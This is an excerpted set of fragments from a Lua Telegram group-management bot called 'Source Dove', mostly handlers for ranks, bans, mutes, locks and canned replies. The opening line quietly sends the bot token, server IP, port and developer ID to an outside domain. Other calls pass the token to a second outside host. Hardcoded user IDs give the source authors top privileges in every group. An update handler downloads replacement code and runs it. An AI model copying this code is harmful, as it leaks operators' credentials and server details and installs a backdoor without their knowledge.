...
https.request("https://apiabs.ml/Api/Dove/index.php?Get=Dove&DevId="..DevRio:get(Server.."IdDove").."&TokenBot="..DevRio:get(Server.."TokenDove").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
...
DevId = Config.DevId
SudoIds = {Config.SudoIds,2044593457,1853749569,2044593457,2044593457}
Dove = Config.Dove
...
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(2044593457) then DoveTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1853749569) then DoveTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(2044593457) then DoveTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(2044593457) then DoveTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Dove) then DoveTeam = 'البوت' elseif SudoId(user_id) then DoveTeam = 'المطور الاساسي' elseif DevRio:sismember(Dove..'Rio:RioSudo:', user_id) then DoveTeam = 'المطور الاساسي' elseif DevRio:sismember(Dove..'Rio:SecondSudo:', user_id) then DoveTeam = 'المطور الاساسي²' elseif DevRio:sismember(Dove..'Rio:SudoBot:', user_id) then DoveTeam = DevRio:get(Dove.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(Dove..'Rio:Owner:'..chat_id, user_id) then DoveTeam = DevRio:get(Dove.."Rio:Owner:Rd"..chat_id) or 'المالك' elseif DevRio:sismember(Dove..'Rio:RioConstructor:'..chat_id, user_id) then DoveTeam = 'المالك' elseif DevRio:sismember(Dove..'Rio:BasicConstructor:'..chat_id, user_id) then DoveTeam = DevRio:get(Dove.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(Dove..'Rio:Constructor:'..chat_id, user_id) then DoveTeam = DevRio:get(Dove.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(Dove..'Rio:Managers:'..chat_id, user_id) then DoveTeam = DevRio:get(Dove.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(Dove..'Rio:Admins:'..chat_id, user_id) then DoveTeam = DevRio:get(Dove.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(Dove..'Rio:VipMem:'..chat_id, user_id) then  DoveTeam = DevRio:get(Dove.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(Dove..'Rio:Cleaner:'..chat_id, user_id) then  DoveTeam = DevRio:get(Dove.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else DoveTeam = DevRio:get(Dove.."Rio:mem:Rd"..chat_id) or 'العضو' end return DoveTeam end
--     Source Dove     --
...
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/Dove/Yt.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌔ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/Dove/Yt.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌔ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/Dove/Yt.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌔ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/Dove/Yt.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
...
DevRio:del(Dove..'Rio:Text:KtTexts'..Rio..data.chat_id_)
DevRio:srem(Dove..'Rio:Sudo:Kt'..data.chat_id_,Rio)
end
...
local List = DevRio:smembers(Dove..'Rio:Text:KtTexts'..Rio..data.chat_id_)
if DevRio:get(Dove..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌔︰تم انهاء وحفظ ↫ "..#List.." من الاسئله للامر ↫ "..Rio) 
DevRio:del(Dove..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "⌔︰عذرا صلاحية الامر منتهيه !") 
end
end
...
DevRio:del(Dove..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_)
DevRio:del(Dove..'Rio:Text:KtTexts'..Rio..data.chat_id_)
DevRio:del(Dove..'Rio:Add:KtTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(Dove..'Rio:Sudo:Kt'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "⌔︰عذرا صلاحية الامر منتهيه !") 
end
...
local Text ='*⌔︰تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/mp3:"..data.sender_user_id_}},{{text=". Source Dove ⌔",url="t.me/EEPEF"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/memz:"..data.sender_user_id_}},{{text=". Source Dove ⌔",url="t.me/EEPEF"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/gif:"..data.sender_user_id_}},{{text=". Source Dove ⌔",url="t.me/EEPEF"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/photo:"..data.sender_user_id_}},{{text=". Source Dove ⌔",url="t.me/EEPEF"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/anime:"..data.sender_user_id_}},{{text=". Source Dove ⌔",url="t.me/EEPEF"}}} 
...
DevRio:sadd(Dove..'Rio:VipMem:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌔︰العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'EEPEF')..')\n⌔︰تم رفعه في قائمة المميزين')
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Dove..'Rio:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Dove..'Rio:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Dove..'Rio:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Dove..'Rio:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Dove..'Rio:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Dove..'Rio:RioConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Dove..'Rio:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Dove..'Rio:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Dove..'Rio:RioSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:VipMem:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:RioConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:RioSudo:'..data.chat_id_,dp.id_)
...
DevRio:sadd(Dove..'Rio:Ban:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌔︰العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'EEPEF')..')\n⌔︰تم حظره')
end
end
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:Ban:'..data.chat_id_,dp.id_)
...
if DevRio:sismember(Dove..'Rio:Muted:'..data.chat_id_, dp.id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌔︰هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(Dove..'Rio:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌔︰العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'EEPEF')..')\n⌔︰تم كتمه')
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌔︰العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'EEPEF')..')\n⌔︰تم الغاء كتمه')
end,nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Dove..'Rio:BanAll:', dp.id_)
DevRio:srem(Dove..'Rio:MuteAll:', dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌔︰العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'EEPEF')..')\n⌔︰تم الغاء العام')
end,nil)
end
...
DevRio:sadd(Dove..'Rio:Tkeed:'..data.chat_id_, dp.id_)
...
DevRio:srem(Dove..'Rio:Tkeed:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌔︰العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'EEPEF')..')\n⌔︰تم الغاء تقيده')
end,nil)
end
--     Source Dove     --
...
local Text = '⌔︰قم باستعمال الازرار لرفع العضو ↫ ⤈\n⌔︰العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'EEPEF')..')'
keyboard = {} 
if Sudo(data) then
...
local Del = DevRio:get(Dove..'Rio:Del')
local Text = [[
...
DevRio:del(Dove..'Rio:Owner:'..data.chat_id_)
...
DevRio:del(Dove..'Rio:Constructor:'..data.chat_id_)
...
DevRio:del(Dove..'Rio:Managers:'..data.chat_id_)
Text = "*⌔︰تم حذف المدراء*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:del(Dove..'Rio:Admins:'..data.chat_id_)
...
DevRio:del(Dove..'Rio:VipMem:'..data.chat_id_)
...
DevRio:del(Dove..'Rio:Cleaner:'..data.chat_id_)
...
DevRio:del(Dove..'Rio:Muted:'..data.chat_id_)
...
local List = DevRio:smembers(Dove..'Rio:Tkeed:'..data.chat_id_)
for k,v in pairs(List) do   
...
DevRio:srem(Dove..'Rio:Tkeed:'..data.chat_id_, v)
end
...
DevRio:del(Dove..'Rio:Ban:'..data.chat_id_)
...
--     Source Dove     --
if DataText and DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)') and not DevRio:get(Dove..'Rio:Lock:GpRd'..data.chat_id_) then
local Rio = DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevRio:smembers(Dove..'Rio:Manager:GpRed'..data.chat_id_)
if #redod == 0 then
Text = "*⌔︰لا توجد ردود مضافه*"
else
for k,v in pairs(redod) do
DevRio:del(Dove..'Rio:Gif:GpRed'..v..data.chat_id_)
DevRio:del(Dove..'Rio:Voice:GpRed'..v..data.chat_id_)
DevRio:del(Dove..'Rio:Audio:GpRed'..v..data.chat_id_)
DevRio:del(Dove..'Rio:Photo:GpRed'..v..data.chat_id_)
DevRio:del(Dove..'Rio:Stecker:GpRed'..v..data.chat_id_)
DevRio:del(Dove..'Rio:Video:GpRed'..v..data.chat_id_)
DevRio:del(Dove..'Rio:File:GpRed'..v..data.chat_id_)
DevRio:del(Dove..'Rio:Text:GpRed'..v..data.chat_id_)
DevRio:del(Dove..'Rio:Manager:GpRed'..data.chat_id_)
end
...
if DataText and DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)') and not DevRio:get(Dove..'Rio:Lock:GpRd'..data.chat_id_) then
...
local List = DevRio:smembers(Dove.."List:Cmd:Group:New"..data.chat_id_)
for k,v in pairs(List) do
DevRio:del(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":"..v)
DevRio:del(Dove.."List:Cmd:Group:New"..data.chat_id_)
end
...
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":ا","ايدي")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"ا")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":م","رفع مميز")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"م")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":اد","رفع ادمن")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"اد")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":مد","رفع مدير")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"مد")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":من","رفع منشئ")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"من")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":اس","رفع منشئ اساسي")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"اس")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":مط","رفع مطور")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"مط")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":ثانوي","رفع مطور ثانوي")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"ثانوي")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":تك","تنزيل الكل")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"تك")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"تعط")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"تفع")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":ر","الرابط")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"ر")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":رر","ردود المدير")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"رر")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":،،","مسح المكتومين")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"،،")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":رد","اضف رد")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"رد")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":غ","غنيلي")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"غ")
DevRio:set(Dove.."Set:Cmd:Group:New1"..data.chat_id_..":#","مسح قائمه العام")
DevRio:sadd(Dove.."List:Cmd:Group:New"..data.chat_id_,"#")
...
DevRio:sadd(Dove..'Rio:Admins:'..data.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Dove..'Rio:Admins:'..data.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevRio:sadd(Dove..'Rio:Admins:'..data.chat_id_, admins[i].user_id_)
...
DevRio:sadd(Dove.."Rio:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
DevRio:sadd(Dove.."Rio:RioConstructor:"..data.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Dove.."Rio:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
DevRio:srem(Dove.."Rio:RioConstructor:"..data.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevRio:sismember(Dove..'Rio:Groups',data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, '⌔︰المجموعه بالتاكيد مفعله')
else
Text = "⌔︰تم تفعيل المجموعه "..dp.title_
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..data.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..data.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..data.sender_user_id_}},{{text="‹ Source Dove ›",url="t.me/EEPEF"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevRio:sadd(Dove.."Rio:Groups",data.chat_id_)
if not DevRio:get(Dove..'Rio:SudosGp'..data.sender_user_id_..data.chat_id_) and not SecondSudo(data) then 
DevRio:incrby(Dove..'Rio:Sudos'..data.sender_user_id_,1)
DevRio:set(Dove..'Rio:SudosGp'..data.sender_user_id_..data.chat_id_,"rio")
end
...
DevRio:set(Dove.."Rio:Groups:Links"..data.chat_id_,LinkGroup) 
...
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,dp) 
if not DevRio:sismember(Dove..'Rio:Groups',data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌔︰المجموعه بالتاكيد معطله") 
else
Text = "⌔︰تم تعطيل المجموعه "..dp.title_
keyboard = {}
keyboard.inline_keyboard = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..data.sender_user_id_}},{{text="‹ Source Dove ›",url="t.me/EEPEF"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevRio:srem(Dove.."Rio:Groups",data.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
Text = "⌔︰تم ترتيب الاوامر بالشكل التالي ~\n⌔︰ ايدي - ا .\n⌔︰ رفع مميز - م .\n⌔︰رفع ادمن - اد .\n⌔︰ رفع مدير - مد . \n⌔︰ رفع منشى - من . \n⌔︰ رفع منشئ الاساسي - اس  .\n⌔︰ رفع مطور - مط .\n⌔︰رفع مطور ثانوي - ثانوي .\n⌔︰ تنزيل الكل - تك .\n⌔︰ تعطيل الايدي بالصوره - تعط .\n⌔︰ تفعيل الايدي بالصوره - تفع .\n⌔︰ الرابط - ر .\n⌔︰ ردود المدير - رر .\n⌔︰ مسح المكتومين - ،، .\n⌔︰ اضف رد - رد .\n⌔︰ مسح سحكاتي - سح .\n⌔︰ مسح رسائلي - رس .\n⌔︰ غنيلي - غ .\n⌔︰مسح قائمه العام - #"
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ رجوع ›",callback_data="/Reload:"..data.sender_user_id_}},{{text='‹ Source Dove ›',url="t.me/EEPEF"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source David     --
...
DevRio:sadd(Dove..'Rio:BasicConstructor:'..data.chat_id_,Manager_id)  
DevRio:sadd(Dove..'Rio:RioConstructor:'..data.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
DevRio:del(Dove.."Rio:Add:AllText"..data.sender_user_id_)
DevRio:del(Dove.."Rio:Add:AllRed"..data.sender_user_id_)
DevRio:del(Dove.."DelSudoRep")
Text = "⌔︰تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
...
local DelManagerRep = DevRio:get(Dove..'DelManagerRep'..data.chat_id_)
DevRio:srem(Dove..'Rio:Manager:GpRed'..data.chat_id_,DelManagerRep)
DevRio:del(Dove..'Rio:Add:GpText'..data.sender_user_id_..data.chat_id_)
DevRio:del(Dove..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_)
DevRio:del(Dove..'DelManagerRep'..data.chat_id_)
Text = "⌔︰تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Cmd = DevRio:get(Dove..'Rio:Cmd')
local Text = [[
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Filter = DevRio:get(Dove..'Rio:Filter')
local Text = [[
...
DevRio:del(Dove.."Rio:FilterAnimation"..data.chat_id_)
...
DevRio:del(Dove.."Rio:FilterSteckr"..data.chat_id_)
...
DevRio:del(Dove.."Rio:FilterPhoto"..data.chat_id_)
...
DevRio:del(Dove..'Rio:Filters:'..data.chat_id_)
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local LockBotList = DevRio:get(Dove..'Rio:LockBotList')
local Text = [[
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local LockSpamList = DevRio:get(Dove..'Rio:LockSpamList')
local Text = [[
...
if not DevRio:get(Dove..'Rio:Lock:Join'..data.chat_id_) then
DevRio:set(Dove..'Rio:Lock:Join'..data.chat_id_,true)
...
if DevRio:get(Dove..'Rio:Lock:Join'..data.chat_id_) then
DevRio:del(Dove..'Rio:Lock:Join'..data.chat_id_)
...
if not DevRio:get(Dove..'Rio:Lock:Text'..data.chat_id_) then
DevRio:set(Dove..'Rio:Lock:Text'..data.chat_id_,true)
...
if DevRio:get(Dove..'Rio:Lock:Text'..data.chat_id_) then
DevRio:del(Dove..'Rio:Lock:Text'..data.chat_id_)
...
if not DevRio:get(Dove..'Rio:Lock:TagServr'..data.chat_id_) then
DevRio:set(Dove..'Rio:Lock:TagServr'..data.chat_id_,true)
...
if DevRio:get(Dove..'Rio:Lock:TagServr'..data.chat_id_) then
DevRio:del(Dove..'Rio:Lock:TagServr'..data.chat_id_) 
...
if not DevRio:get(Dove..'Rio:Lock:EditMsgs'..data.chat_id_) then
DevRio:set(Dove..'Rio:Lock:EditMsgs'..data.chat_id_,true)
...
if DevRio:get(Dove..'Rio:Lock:EditMsgs'..data.chat_id_) then
DevRio:del(Dove..'Rio:Lock:EditMsgs'..data.chat_id_)
...
if not DevRio:get(Dove..'Rio:Lock:Stickers'..data.chat_id_) then
DevRio:set(Dove..'Rio:Lock:Stickers'..data.chat_id_,true)
...
if DevRio:get(Dove..'Rio:Lock:Stickers'..data.chat_id_) then
DevRio:del(Dove..'Rio:Lock:Stickers'..data.chat_id_)
...
if not DevRio:get(Dove..'Rio:Lock:Gifs'..data.chat_id_) then
DevRio:set(Dove..'Rio:Lock:Gifs'..data.chat_id_,true)
...
if DevRio:get(Dove..'Rio:Lock:Gifs'..data.chat_id_) then
DevRio:del(Dove..'Rio:Lock:Gifs'..data.chat_id_)
...
if not DevRio:get(Dove..'Rio:Lock:Photo'..data.chat_id_) then
DevRio:set(Dove..'Rio:Lock:Photo'..data.chat_id_,true) 
...
if DevRio:get(Dove..'Rio:Lock:Photo'..data.chat_id_) then
DevRio:del(Dove..'Rio:Lock:Photo'..data.chat_id_)
...
if not DevRio:get(Dove..'Rio:Lock:Videos'..data.chat_id_) then
DevRio:set(Dove..'Rio:Lock:Videos'..data.chat_id_,true)
...
if DevRio:get(Dove..'Rio:Lock:Videos'..data.chat_id_) then
DevRio:del(Dove..'Rio:Lock:Videos'..data.chat_id_)
...
if not DevRio:get(Dove..'Rio:Lock:Forwards'..data.chat_id_) then
DevRio:set(Dove..'Rio:Lock:Forwards'..data.chat_id_,true)
...
if DevRio:get(Dove..'Rio:Lock:Forwards'..data.chat_id_) then
DevRio:del(Dove..'Rio:Lock:Forwards'..data.chat_id_) 
...
DevRio:set(Dove.."Rio:Lock:Bots"..data.chat_id_,"kick")  
...
DevRio:set(Dove.."Rio:Lock:Bots"..data.chat_id_,"ked")   
...
DevRio:set(Dove.."Rio:Lock:Bots"..data.chat_id_,"del")  
...
DevRio:del(Dove.."Rio:Lock:Bots"..data.chat_id_) 
...
DevRio:hset(Dove.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","kick")  
...
DevRio:hset(Dove.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","keed")  
...
DevRio:hset(Dove.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","del")  
...
DevRio:hset(Dove.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","mute")  
...
DevRio:hdel(Dove.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User")  
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Source = DevRio:get(Dove..'Rio:Source')
local Text = [[
...
os.execute('rm -rf Dove.lua') 
os.execute('wget https://raw.githubusercontent.com/Dove-TeaMLar/Dove/master/Dove.lua') 
dofile('Dove.lua') 
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Media = DevRio:get(Dove..'Rio:Media')
local Text = [[
...
local List = DevRio:smembers(Dove.."Rio:cleaner"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
local List = DevRio:smembers(Dove.."Rio:cleanermusic"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(Dove.."Rio:cleanermusic"..data.chat_id_)
else
...
if not DevRio:get(Dove.."Rio:Lock:GpLinksinline"..data.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..data.chat_id_)) or DevRio:get(Dove.."Private:Group:Link"..data.chat_id_) 
...
if not DevRio:get(Dove..'Rio:Lock:GpLinks'..data.chat_id_) then 
if DevRio:get(Dove.."Rio:Groups:Links"..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌔︰Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevRio:get(Dove.."Rio:Groups:Links"..data.chat_id_), 1, "html")
else 
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local order = DevRio:get(Dove..'Rio:order')
local Text = [[
...
